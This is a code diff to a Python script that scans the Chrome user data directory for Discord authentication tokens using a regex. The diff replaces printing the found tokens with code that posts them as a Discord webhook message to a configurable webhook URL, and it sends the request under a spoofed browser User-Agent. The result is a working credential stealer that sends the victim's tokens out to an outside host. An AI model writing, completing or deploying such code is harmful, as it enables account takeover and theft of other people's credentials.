@@ -2,9 +2,30 @@ import re
 import os
 import base64
 import typing
+import json
+import urllib.request
 
 
-TOKEN_REGEX_PATTERN = r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}'
+TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
+REQUEST_HEADERS = {
+    "Content-Type":
+        "application/json",
+    "User-Agent":
+        "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
+}
+WEBHOOK_URL = "YOUR WEBHOOK URL"
+
+
+def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
+    request = urllib.request.Request(
+        api_url, data=json.dumps(data).encode(),
+        headers=REQUEST_HEADERS
+    )
+
+    with urllib.request.urlopen(request) as response:
+        response_status = response.status
+
+    return response_status
 
 
 def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
@@ -60,6 +81,23 @@ def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
     return id_to_tokens
 
 
+def send_tokens_to_webhook(
+    webhook_url: str, user_id_to_token: typing.Dict[str, set[str]]
+) -> int:
+
+    fields: list[dict] = list()
+
+    for user_id, tokens in user_id_to_token.items():
+        fields.append({
+            "name": user_id,
+            "value": "\n".join(tokens)
+        })
+
+    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
+
+    make_post_request(webhook_url, data)
+
+
 def main() -> None:
 
     chrome_path = os.path.join(
@@ -69,7 +107,7 @@ def main() -> None:
 
     tokens = get_tokens_from_path(chrome_path)
 
-    print(tokens)
+    send_tokens_to_webhook(WEBHOOK_URL, tokens)
 
 
 if __name__ == "__main__":
